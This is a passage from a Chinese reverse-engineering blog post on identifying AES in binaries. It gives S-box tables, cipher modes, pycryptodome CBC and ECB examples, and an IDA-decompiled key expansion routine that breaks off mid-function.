class="token punctuation">(</span>text<span class="token punctuation">)</span>   <span class="token comment"># 填充</span>enc <span class="token operator">=</span> des<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>padded_text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 加密，结果为 16 进制字节流</span><span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 将字节对象转换为十六进制字符串</span>dec <span class="token operator">=</span> des<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>  <span class="token comment"># 解密</span><span class="token keyword">print</span><span class="token punctuation">(</span>dec<span class="token punctuation">)</span><span class="token triple-quoted-string string">''' 输出：b'8c8641d37affbc2b251cbd968cb124a8'welcome_to_uf4te'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><blockquote><p>AES 加密，即高级加密标准（Advanced Encryption Standard），属于对称加密算法，基于数据块的加密方式：分组输入、分组输出，该算法已被用来替代 DES 算法，并在世界范围内广泛使用</p><p>AES 加密算法的速度比公钥加密等加密算法快很多，在很多场合都需要 AES 对称加密，主要缺点在于要求加密和解密双方都使用相同的密钥</p><p>参考文献：  </p><ol><li><a href="https://www.cnblogs.com/Hellowshuo/p/15706590.html">python实现AES加密解密 - Hello_wshuo - 博客园</a>  </li><li><a href="https://blog.csdn.net/abel_big_xu/article/details/115703082">逆向分析中的密码学—AES_0x01 0x02 0x04 0x08是什么意思-CSDN博客</a></li></ol></blockquote><h2 id="特点-7"><a href="#特点-7" class="headerlink" title="特点"></a>特点</h2><ol><li>AES 按照密钥的长度可以分为：AES-128、AES-192、AES-256 三种</li></ol><table><thead><tr><th></th><th>密钥长度</th><th>分组长度</th><th>轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>128 bit</td><td>4 bit</td><td>10 轮</td></tr><tr><td>AES-192</td><td>192 bit</td><td>4 bit</td><td>12 轮</td></tr><tr><td>AES-256</td><td>256 bit</td><td>4 bit</td><td>14 轮</td></tr></tbody></table><ol start="2"><li>加解密的字节替代过程中使用了 <code>s_box</code> 和逆 <code>s_box</code> 完成一个字节到另一个字节的映射</li></ol><p><code>s</code> 盒：</p><table><thead><tr><th>行&#x2F;列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x63</td><td>0x7c</td><td>0x77</td><td>0x7b</td><td>0xf2</td><td>0x6b</td><td>0x6f</td><td>0xc5</td><td>0x30</td><td>0x01</td><td>0x67</td><td>0x2b</td><td>0xfe</td><td>0xd7</td><td>0xab</td><td>0x76</td></tr><tr><td>1</td><td>0xca</td><td>0x82</td><td>0xc9</td><td>0x7d</td><td>0xfa</td><td>0x59</td><td>0x47</td><td>0xf0</td><td>0xad</td><td>0xd4</td><td>0xa2</td><td>0xaf</td><td>0x9c</td><td>0xa4</td><td>0x72</td><td>0xc0</td></tr><tr><td>2</td><td>0xb7</td><td>0xfd</td><td>0x93</td><td>0x26</td><td>0x36</td><td>0x3f</td><td>0xf7</td><td>0xcc</td><td>0x34</td><td>0xa5</td><td>0xe5</td><td>0xf1</td><td>0x71</td><td>0xd8</td><td>0x31</td><td>0x15</td></tr><tr><td>3</td><td>0x04</td><td>0xc7</td><td>0x23</td><td>0xc3</td><td>0x18</td><td>0x96</td><td>0x05</td><td>0x9a</td><td>0x07</td><td>0x12</td><td>0x80</td><td>0xe2</td><td>0xeb</td><td>0x27</td><td>0xb2</td><td>0x75</td></tr><tr><td>4</td><td>0x09</td><td>0x83</td><td>0x2c</td><td>0x1a</td><td>0x1b</td><td>0x6e</td><td>0x5a</td><td>0xa0</td><td>0x52</td><td>0x3b</td><td>0xd6</td><td>0xb3</td><td>0x29</td><td>0xe3</td><td>0x2f</td><td>0x84</td></tr><tr><td>5</td><td>0x53</td><td>0xd1</td><td>0x00</td><td>0xed</td><td>0x20</td><td>0xfc</td><td>0xb1</td><td>0x5b</td><td>0x6a</td><td>0xcb</td><td>0xbe</td><td>0x39</td><td>0x4a</td><td>0x4c</td><td>0x58</td><td>0xcf</td></tr><tr><td>6</td><td>0xd0</td><td>0xef</td><td>0xaa</td><td>0xfb</td><td>0x43</td><td>0x4d</td><td>0x33</td><td>0x85</td><td>0x45</td><td>0xf9</td><td>0x02</td><td>0x7f</td><td>0x50</td><td>0x3c</td><td>0x9f</td><td>0xa8</td></tr><tr><td>7</td><td>0x51</td><td>0xa3</td><td>0x40</td><td>0x8f</td><td>0x92</td><td>0x9d</td><td>0x38</td><td>0xf5</td><td>0xbc</td><td>0xb6</td><td>0xda</td><td>0x21</td><td>0x10</td><td>0xff</td><td>0xf3</td><td>0xd2</td></tr><tr><td>8</td><td>0xcd</td><td>0x0c</td><td>0x13</td><td>0xec</td><td>0x5f</td><td>0x97</td><td>0x44</td><td>0x17</td><td>0xc4</td><td>0xa7</td><td>0x7e</td><td>0x3d</td><td>0x64</td><td>0x5d</td><td>0x19</td><td>0x73</td></tr><tr><td>9</td><td>0x60</td><td>0x81</td><td>0x4f</td><td>0xdc</td><td>0x22</td><td>0x2a</td><td>0x90</td><td>0x88</td><td>0x46</td><td>0xee</td><td>0xb8</td><td>0x14</td><td>0xde</td><td>0x5e</td><td>0x0b</td><td>0xdb</td></tr><tr><td>A</td><td>0xe0</td><td>0x32</td><td>0x3a</td><td>0x0a</td><td>0x49</td><td>0x06</td><td>0x24</td><td>0x5c</td><td>0xc2</td><td>0xd3</td><td>0xac</td><td>0x62</td><td>0x91</td><td>0x95</td><td>0xe4</td><td>0x79</td></tr><tr><td>B</td><td>0xe7</td><td>0xc8</td><td>0x37</td><td>0x6d</td><td>0x8d</td><td>0xd5</td><td>0x4e</td><td>0xa9</td><td>0x6c</td><td>0x56</td><td>0xf4</td><td>0xea</td><td>0x65</td><td>0x7a</td><td>0xae</td><td>0x08</td></tr><tr><td>C</td><td>0xba</td><td>0x78</td><td>0x25</td><td>0x2e</td><td>0x1c</td><td>0xa6</td><td>0xb4</td><td>0xc6</td><td>0xe8</td><td>0xdd</td><td>0x74</td><td>0x1f</td><td>0x4b</td><td>0xbd</td><td>0x8b</td><td>0x8a</td></tr><tr><td>D</td><td>0x70</td><td>0x3e</td><td>0xb5</td><td>0x66</td><td>0x48</td><td>0x03</td><td>0xf6</td><td>0x0e</td><td>0x61</td><td>0x35</td><td>0x57</td><td>0xb9</td><td>0x86</td><td>0xc1</td><td>0x1d</td><td>0x9e</td></tr><tr><td>E</td><td>0xe1</td><td>0xf8</td><td>0x98</td><td>0x11</td><td>0x69</td><td>0xd9</td><td>0x8e</td><td>0x94</td><td>0x9b</td><td>0x1e</td><td>0x87</td><td>0xe9</td><td>0xce</td><td>0x55</td><td>0x28</td><td>0xdf</td></tr><tr><td>F</td><td>0x8c</td><td>0xa1</td><td>0x89</td><td>0x0d</td><td>0xbf</td><td>0xe6</td><td>0x42</td><td>0x68</td><td>0x41</td><td>0x99</td><td>0x2d</td><td>0x0f</td><td>0xb0</td><td>0x54</td><td>0xbb</td><td>0x16</td></tr></tbody></table><p>逆 <code>s</code> 盒：</p><table><thead><tr><th>行&#x2F;列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x52</td><td>0x09</td><td>0x6a</td><td>0xd5</td><td>0x30</td><td>0x36</td><td>0xa5</td><td>0x38</td><td>0xbf</td><td>0x40</td><td>0xa3</td><td>0x9e</td><td>0x81</td><td>0xf3</td><td>0xd7</td><td>0xfb</td></tr><tr><td>1</td><td>0x7c</td><td>0xe3</td><td>0x39</td><td>0x82</td><td>0x9b</td><td>0x2f</td><td>0xff</td><td>0x87</td><td>0x34</td><td>0x8e</td><td>0x43</td><td>0x44</td><td>0xc4</td><td>0xde</td><td>0xe9</td><td>0xcb</td></tr><tr><td>2</td><td>0x54</td><td>0x7b</td><td>0x94</td><td>0x32</td><td>0xa6</td><td>0xc2</td><td>0x23</td><td>0x3d</td><td>0xee</td><td>0x4c</td><td>0x95</td><td>0x0b</td><td>0x42</td><td>0xfa</td><td>0xc3</td><td>0x4e</td></tr><tr><td>3</td><td>0x08</td><td>0x2e</td><td>0xa1</td><td>0x66</td><td>0x28</td><td>0xd9</td><td>0x24</td><td>0xb2</td><td>0x76</td><td>0x5b</td><td>0xa2</td><td>0x49</td><td>0x6d</td><td>0x8b</td><td>0xd1</td><td>0x25</td></tr><tr><td>4</td><td>0x72</td><td>0xf8</td><td>0xf6</td><td>0x64</td><td>0x86</td><td>0x68</td><td>0x98</td><td>0x16</td><td>0xd4</td><td>0xa4</td><td>0x5c</td><td>0xcc</td><td>0x5d</td><td>0x65</td><td>0xb6</td><td>0x92</td></tr><tr><td>5</td><td>0x6c</td><td>0x70</td><td>0x48</td><td>0x50</td><td>0xfd</td><td>0xed</td><td>0xb9</td><td>0xda</td><td>0x5e</td><td>0x15</td><td>0x46</td><td>0x57</td><td>0xa7</td><td>0x8d</td><td>0x9d</td><td>0x84</td></tr><tr><td>6</td><td>0x90</td><td>0xd8</td><td>0xab</td><td>0x00</td><td>0x8c</td><td>0xbc</td><td>0xd3</td><td>0x0a</td><td>0xf7</td><td>0xe4</td><td>0x58</td><td>0x05</td><td>0xb8</td><td>0xb3</td><td>0x45</td><td>0x06</td></tr><tr><td>7</td><td>0xd0</td><td>0x2c</td><td>0x1e</td><td>0x8f</td><td>0xca</td><td>0x3f</td><td>0x0f</td><td>0x02</td><td>0xc1</td><td>0xaf</td><td>0xbd</td><td>0x03</td><td>0x01</td><td>0x13</td><td>0x8a</td><td>0x6b</td></tr><tr><td>8</td><td>0x3a</td><td>0x91</td><td>0x11</td><td>0x41</td><td>0x4f</td><td>0x67</td><td>0xdc</td><td>0xea</td><td>0x97</td><td>0xf2</td><td>0xcf</td><td>0xce</td><td>0xf0</td><td>0xb4</td><td>0xe6</td><td>0x73</td></tr><tr><td>9</td><td>0x96</td><td>0xac</td><td>0x74</td><td>0x22</td><td>0xe7</td><td>0xad</td><td>0x35</td><td>0x85</td><td>0xe2</td><td>0xf9</td><td>0x37</td><td>0xe8</td><td>0x1c</td><td>0x75</td><td>0xdf</td><td>0x6e</td></tr><tr><td>A</td><td>0x47</td><td>0xf1</td><td>0x1a</td><td>0x71</td><td>0x1d</td><td>0x29</td><td>0xc5</td><td>0x89</td><td>0x6f</td><td>0xb7</td><td>0x62</td><td>0x0e</td><td>0xaa</td><td>0x18</td><td>0xbe</td><td>0x1b</td></tr><tr><td>B</td><td>0xfc</td><td>0x56</td><td>0x3e</td><td>0x4b</td><td>0xc6</td><td>0xd2</td><td>0x79</td><td>0x20</td><td>0x9a</td><td>0xdb</td><td>0xc0</td><td>0xfe</td><td>0x78</td><td>0xcd</td><td>0x5a</td><td>0xf4</td></tr><tr><td>C</td><td>0x1f</td><td>0xdd</td><td>0xa8</td><td>0x33</td><td>0x88</td><td>0x07</td><td>0xc7</td><td>0x31</td><td>0xb1</td><td>0x12</td><td>0x10</td><td>0x59</td><td>0x27</td><td>0x80</td><td>0xec</td><td>0x5f</td></tr><tr><td>D</td><td>0x60</td><td>0x51</td><td>0x7f</td><td>0xa9</td><td>0x19</td><td>0xb5</td><td>0x4a</td><td>0x0d</td><td>0x2d</td><td>0xe5</td><td>0x7a</td><td>0x9f</td><td>0x93</td><td>0xc9</td><td>0x9c</td><td>0xef</td></tr><tr><td>E</td><td>0xa0</td><td>0xe0</td><td>0x3b</td><td>0x4d</td><td>0xae</td><td>0x2a</td><td>0xf5</td><td>0xb0</td><td>0xc8</td><td>0xeb</td><td>0xbb</td><td>0x3c</td><td>0x83</td><td>0x53</td><td>0x99</td><td>0x61</td></tr><tr><td>F</td><td>0x17</td><td>0x2b</td><td>0x04</td><td>0x7e</td><td>0xba</td><td>0x77</td><td>0xd6</td><td>0x26</td><td>0xe1</td><td>0x69</td><td>0x14</td><td>0x63</td><td>0x55</td><td>0x21</td><td>0x0c</td><td>0x7d</td></tr></tbody></table><ol start="3"><li>通过 IDA 插件 <code>Findcrypt</code> 可以识别出 AES</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%819.png" alt="加密算法的函数特征9.png"></p><hr><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><blockquote><p>详细过程参考：</p><ol><li><a href="https://www.cnblogs.com/gaoyucan/p/17087521.html">逆向中的常见密码的识别（持续更新中） - gaoyucan - 博客园</a>  </li><li><a href="https://www.cnblogs.com/luop/p/4334160.html">密码算法详解——AES - ReadingLover - 博客园</a></li></ol></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%818.png" alt="加密算法的函数特征8.png"></p><p>AES 常用的加密工作模式有：ECB，CBC，OFB，CFB，CTR</p><table><thead><tr><th align="left">模式</th><th align="left">含义</th><th align="left">偏移量 IV</th></tr></thead><tbody><tr><td align="left">ECB</td><td align="left">电子密码本模式</td><td align="left">无</td></tr><tr><td align="left">CBC</td><td align="left">密码分组链接模式</td><td align="left">有</td></tr><tr><td align="left">OFB</td><td align="left">输出反馈模式</td><td align="left">有</td></tr><tr><td align="left">CFB</td><td align="left">密码反馈模式</td><td align="left">有</td></tr><tr><td align="left">CTR</td><td align="left">计数器模式</td><td align="left">有</td></tr></tbody></table><p>最常用的是 ECB 和 CBC 模式，主要区别在于 ECB 无需偏移量 IV，CBC 需要偏移量</p><hr><h2 id="加解密代码-6"><a href="#加解密代码-6" class="headerlink" title="加解密代码"></a>加解密代码</h2><blockquote><p>如果在 Windows 平台下，使用 <code>from Crypto.Cipher import AES</code> 遇到关于 <code>Module Not Found Error : No module named &#39;Crypto&#39;</code> 的报错，可尝试如下办法解决</p><p>参考文献：</p><ol><li><a href="https://blog.csdn.net/chouzhou9701/article/details/106432497/">关于Module Not Found Error No module named Crypto解决_windows modulenotfounderror: no module named ‘cryp-CSDN博客</a></li></ol></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip uninstall cryptopip uninstall pycryptodomepip <span class="token function">install</span> pycryptodome<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Python-版（CBC-模式）-1"><a href="#Python-版（CBC-模式）-1" class="headerlink" title="Python 版（CBC 模式）"></a>Python 版（CBC 模式）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES  <span class="token keyword">import</span> binascii    key <span class="token operator">=</span> <span class="token string">b'1234567812345678'</span>  <span class="token comment"># 秘钥，bytes 类型  </span>iv <span class="token operator">=</span> <span class="token string">b'1234567812345678'</span>  <span class="token comment"># iv 偏移量，bytes 类型  </span>text <span class="token operator">=</span> <span class="token string">b'welcome_to_uf4te'</span>  <span class="token comment"># 需要加解密的内容，bytes 类型  </span>  aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>  <span class="token comment"># 创建一个 AES 对象，AES.MODE_CBC 表示 CBC 模式  </span>den_text <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>text<span class="token punctuation">)</span>  <span class="token comment"># 解密，bytes 类型  </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密："</span><span class="token punctuation">,</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>den_text<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 将字节对象转换为十六进制字符串  </span>  aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>  <span class="token comment"># CBC 模式下解密需要重新创建一个 AES 对象，AES.MODE_CBC 表示 CBC 模式  </span>en_text <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>den_text<span class="token punctuation">)</span>  <span class="token comment"># 加密，bytes 类型  </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密："</span><span class="token punctuation">,</span> en_text<span class="token punctuation">)</span><span class="token triple-quoted-string string">''' 输出：解密： b'576fab9d1e22110b39027d9d85f7417f'加密： b'welcome_to_uf4te''''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Python-版（ECB-模式）-1"><a href="#Python-版（ECB-模式）-1" class="headerlink" title="Python 版（ECB 模式）"></a>Python 版（ECB 模式）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES  <span class="token keyword">import</span> binascii    key <span class="token operator">=</span> <span class="token string">b'1234567812345678'</span>  <span class="token comment"># 秘钥，bytes 类型  </span>text <span class="token operator">=</span> <span class="token string">b'weclome_to_uf4te'</span>  <span class="token comment"># 需要加解密的内容，bytes 类型  </span>  aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>  <span class="token comment"># 创建一个 AES 对象，AES.MODE_ECB 表示模式是 ECB 模式  </span>  den_text <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>text<span class="token punctuation">)</span>  <span class="token comment"># 解密，bytes 类型  </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密："</span><span class="token punctuation">,</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>den_text<span class="token punctuation">)</span><span class="token punctuation">)</span>    en_text <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>den_text<span class="token punctuation">)</span>  <span class="token comment"># 加密，bytes 类型  </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密："</span><span class="token punctuation">,</span> en_text<span class="token punctuation">)</span><span class="token triple-quoted-string string">''' 输出：解密： b'914532f3c0677e44c5169a096ffccbd7'加密： b'weclome_to_uf4te''''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="IDA-示例-6"><a href="#IDA-示例-6" class="headerlink" title="IDA 示例"></a>IDA 示例</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> __cdecl <span class="token function">sub_401EC0</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> <span class="token keyword">int</span> a5<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment">// ebp</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v10<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v12<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v13<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v16<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v17<span class="token punctuation">;</span> <span class="token comment">// edx</span>  _DWORD <span class="token operator">*</span>v18<span class="token punctuation">;</span> <span class="token comment">// ebp</span>  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v21<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v22<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">bool</span> v23<span class="token punctuation">;</span> <span class="token comment">// cc</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v24<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v25<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment">// edi</span>  _DWORD <span class="token operator">*</span>v29<span class="token punctuation">;</span> <span class="token comment">// esi</span>  _DWORD <span class="token operator">*</span>v30<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v31<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">bool</span> v32<span class="token punctuation">;</span> <span class="token comment">// zf</span>  <span class="token keyword">int</span> v33<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v34<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v35<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v36<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">int</span> v37<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v38<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> v39<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-20h] BYREF</span>  <span class="token keyword">int</span> v40<span class="token punctuation">;</span> <span class="token comment">// [esp+2Ch] [ebp+4h]</span>  _DWORD <span class="token operator">*</span>v41<span class="token punctuation">;</span> <span class="token comment">// [esp+30h] [ebp+8h]</span>  <span class="token keyword">int</span> v42<span class="token punctuation">;</span> <span class="token comment">// [esp+30h] [ebp+8h]</span>  <span class="token keyword">int</span> v43<span class="token punctuation">;</span> <span class="token comment">// [esp+34h] [ebp+Ch]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v44<span class="token punctuation">;</span> <span class="token comment">// [esp+38h] [ebp+10h]</span>  <span class="token keyword">int</span> v45<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp+14h]</span>  <span class="token keyword">int</span> v46<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp+14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v47<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp+14h]</span>  v5 <span class="token operator">=</span> a3 <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token operator">/</span> <span class="token number">4</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> v5 <span class="token operator">!=</span> <span class="token number">6</span> <span class="token operator">&amp;&amp;</span> v5 <span class="token operator">!=</span> <span class="token number">8</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> a1<span class="token punctuation">;</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> v5<span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span>  <span class="token function">sub_401E80</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a5<span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">;</span>  v43 <span class="token operator">=</span> v8<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10 <span class="token operator">=</span> v39<span class="token punctuation">;</span>    v45 <span class="token operator">=</span> v5<span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span>v10 <span class="token operator">=</span> <span class="token function">sub_4021A0</span><span class="token punctuation">(</span>a4<span class="token punctuation">)</span><span class="token punctuation">;</span>      v10 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>      a4 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>      <span class="token operator">--</span>v45<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v45 <span class="token punctuation">)</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token function">qmemcpy</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> v39<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v46 <span class="token operator">=</span> v5<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;</span> v8 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v41 <span class="token operator">=</span> <span class="token operator">&amp;</span>unk_4084DC<span class="token punctuation">;</span>    v11 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span> a1<span class="token punctuation">;</span>    v12 <span class="token operator">=</span> <span class="token operator">&amp;</span>a1<span class="token punctuation">[</span>v5 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v13 <span class="token operator">=</span> v12 <span class="token operator">+</span> v11<span class="token punctuation">;</span>      v14 <span class="token operator">=</span> <span class="token function">sub_4021D0</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>v12 <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token operator">*</span>v12 <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// sub_4021D0 函数对 s_box 进行字节的映射</span>      v15 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      v12<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span>v41 <span class="token operator">^</span> <span class="token operator">*</span><span class="token operator">&amp;</span>v13<span class="token punctuation">[</span>a1 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">]</span> <span class="token operator">^</span> v14<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">></span> <span class="token number">6</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v18 <span class="token operator">=</span> v12 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>        v44 